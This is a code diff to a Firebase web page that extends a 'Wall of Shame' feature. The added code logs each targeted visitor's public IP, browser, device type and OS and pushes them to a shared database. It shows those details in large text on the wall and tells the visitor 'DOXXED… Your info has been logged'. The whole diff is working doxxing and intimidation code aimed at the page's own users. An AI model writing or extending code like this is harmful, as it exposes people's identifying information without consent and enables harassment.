@@ -330,16 +330,47 @@ firebase.initializeApp(firebaseConfig);
   const doxxModeRef=db.ref('doxxMode');
   const shameRef=db.ref('wallOfShame');
 
-  // IP LOGGING FUNCTION
+  // IP + DEVICE + BROWSER LOGGING FUNCTION
   async function logToShame(username) {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const userIP = ipData.ip;
       
+      // Detect browser
+      const ua = navigator.userAgent;
+      let browser = 'Unknown';
+      if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+      else if (ua.indexOf('SamsungBrowser') > -1) browser = 'Samsung Internet';
+      else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
+      else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
+      else if (ua.indexOf('Edge') > -1) browser = 'Edge (Legacy)';
+      else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+      else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+      else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+      
+      // Detect device type
+      let deviceType = 'Desktop';
+      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+        deviceType = 'Tablet';
+      } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+        deviceType = 'Mobile';
+      }
+      
+      // Detect OS
+      let os = 'Unknown';
+      if (ua.indexOf('Win') > -1) os = 'Windows';
+      else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+      else if (ua.indexOf('Linux') > -1) os = 'Linux';
+      else if (ua.indexOf('Android') > -1) os = 'Android';
+      else if (ua.indexOf('like Mac') > -1) os = 'iOS';
+      
       shameRef.push({
         username: username,
         ip: userIP,
+        browser: browser,
+        device: deviceType,
+        os: os,
         timestamp: Date.now(),
         deviceId: deviceId
       });
@@ -374,7 +405,16 @@ firebase.initializeApp(firebaseConfig);
           <div style="color:#f00; font-size:2rem; font-weight:bold; margin:15px 0; text-shadow: 0 0 5px #f00;">
             🌐 IP: ${escapeHtml(entry.ip)}
           </div>
-          <div style="color:#888; font-size:1rem;">
+          <div style="color:#ff0; font-size:1.2rem; margin:10px 0;">
+            💻 Device: ${escapeHtml(entry.device || 'Unknown')}
+          </div>
+          <div style="color:#ff0; font-size:1.2rem; margin:10px 0;">
+            🖥️ OS: ${escapeHtml(entry.os || 'Unknown')}
+          </div>
+          <div style="color:#ff0; font-size:1.2rem; margin:10px 0;">
+            🌍 Browser: ${escapeHtml(entry.browser || 'Unknown')}
+          </div>
+          <div style="color:#888; font-size:1rem; margin-top:15px;">
             ⏰ ${date}
           </div>
         `;
@@ -701,7 +741,7 @@ firebase.initializeApp(firebaseConfig);
     doxxMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:99999; text-align:center; font-size:2rem; box-shadow:0 0 30px #f00;';
     doxxMsg.innerHTML = `
       <div style="font-size:3rem; margin-bottom:20px;">💀 DOXXED 💀</div>
-      <div style="font-size:1.5rem;">Your IP has been logged</div>
+      <div style="font-size:1.5rem;">Your info has been logged</div>
       <div style="font-size:1.2rem; margin-top:15px; color:#ff0;">Check the Wall of Shame...</div>
     `;
     document.body.appendChild(doxxMsg);
